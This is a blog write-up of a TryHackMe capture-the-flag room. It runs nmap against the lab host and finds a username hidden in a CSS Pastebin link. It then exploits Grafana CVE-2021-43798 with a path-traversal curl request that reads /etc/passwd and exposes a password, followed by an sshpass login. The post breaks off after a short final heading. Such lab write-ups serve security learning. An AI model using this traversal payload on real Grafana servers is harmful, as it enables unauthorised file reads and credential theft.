---
author:
  name: "chxmxii_"
date: 2023-08-11
linktitle: 
tags:
 - devsecops
type:
- post
- posts
title: Kubernetes for everyone
weight: 10
series:
- Hugo 101
---
Hola, a friend of mine thought it'd be cool for me to check out this room on the THM platform since they know I'm really into Kubernetes and security. I thought it sounded like a fun idea, so I jumped right in!
![](/files/k8s.png#center)
> Room link: https://tryhackme.com/jr/kubernetesforyouly 
---
Okay, so I kicked things off by giving the IP address a scan, hoping to stumble upon something cool or significant. And you know what? My instincts were right on the money – I actually discovered two apps listening on ports 5000 and 3000!
+ ```bash
  ┌──(kali㉿kali)-[~]
  └─$ nmap -F 10.10.55.59
  Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-16 11:07 EDT
  Nmap scan report for 10.10.55.59
  Host is up (0.16s latency).
  Not shown: 96 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  22/tcp   open  ssh
  111/tcp  open  rpcbind
  3000/tcp open  ppp
  5000/tcp open  upnp

  Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
  ```
I excitedly launched my web browser and entered the "<ip>:5000". And guess what? I came across this super fun game called "Etch A Sketch"!

+ ![](/files/sketch.png#center)

However, during my search, I stumbled upon the 'main.css' file. To my surprise, I discovered a Pastebin link within it. Upon opening the link, I was greeted with a base32 encoded string.
But you know what really caught my attention? While I was looking around, I spotted something interesting in the 'main.css' file. It was a Pastebin link! Curiosity piqued, I followed the link and found a base32 encoded string waiting for me. Exciting stuff!
+ ```js
  @import url("https://fonts.googleapis.com/css2?family=Bowlby+One+SC&display=swap");
  /* @import url("https://pastebin.com/cPs69B0y"); */
  @import url("https://fonts.googleapis.com/css2?family=Vollkorn:wght@500&display=swap");
  ```
![](/files/b32.png#center)
After decoding the string, it revealed the word `vagrant`,which led us to discover the user we were searching for.
Curious about the other app running on port 3000, I decided to take a closer look. It turned out to be Grafana, a monitoring tool running version 8.3. After some Googling, I stumbled upon a CVE-2021-43798 that pointed towards a Local File Inclusion (LFI) vulnerability. 
> https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/

+ ```bash
  ┌──(kali㉿kali)-[~]
  └─$ curl --path-as-is 10.10.126.15:3000/public/plugins/alertmanager/../../../../../../../../etc/passwd
  root:x:0:0:root:/root:/bin/ash
  bin:x:1:1:bin:/bin:/sbin/nologin
  daemon:x:2:2:daemon:/sbin:/sbin/nologin
  adm:x:3:4:adm:/var/adm:/sbin/nologin
  lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
  sync:x:5:0:sync:/sbin:/bin/sync
  shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
  halt:x:7:0:halt:/sbin:/sbin/halt
  mail:x:8:12:mail:/var/mail:/sbin/nologin
  news:x:9:13:news:/usr/lib/news:/sbin/nologin
  uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
  operator:x:11:0:operator:/root:/sbin/nologin
  man:x:13:15:man:/usr/man:/sbin/nologin
  postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
  cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
  ftp:x:21:21::/var/lib/ftp:/sbin/nologin
  sshd:x:22:22:sshd:/dev/null:/sbin/nologin
  at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
  squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
  xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
  games:x:35:35:games:/usr/games:/sbin/nologin
  cyrus:x:85:12::/usr/cyrus:/sbin/nologin
  vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
  ntp:x:123:123:NTP:/var/empty:/sbin/nologin
  smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
  guest:x:405:100:guest:/dev/null:/sbin/nologin
  nobody:x:65534:65534:nobody:/:/sbin/nologin
  grafana:x:472:0:hereiamatctf907:/home/grafana:/sbin/nologin
  ```
And voilà! We struck gold and managed to uncover the password. lets do the SSH now!
+ ```bash
  ┌──(kali㉿kali)-[~]
  └─$ sshpass -p hereiamatctf907 ssh -o StrictHostKeyChecking=no vagrant@10.10.126.15
  ```
#### Your Secret Crush
switch root and run the following command to list secrets
dd